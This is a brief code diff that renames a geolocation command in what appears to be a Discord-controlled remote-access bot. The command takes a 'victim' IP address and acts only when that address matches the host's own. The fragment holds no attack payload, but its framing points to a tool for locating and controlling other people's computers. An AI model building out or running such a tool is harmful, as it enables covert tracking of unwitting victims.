@@ -16,7 +16,7 @@ class Geolocate(commands.Cog):
             discord.Option("victim", description="IP Address of specific victim", required=True),
         ],
     )
-    async def geolocate(self, ctx, victim):
+    async def get_geolocation(self, ctx, victim):
         if str(victim) == str(self.ip_addr):
             await ctx.response.defer()
             
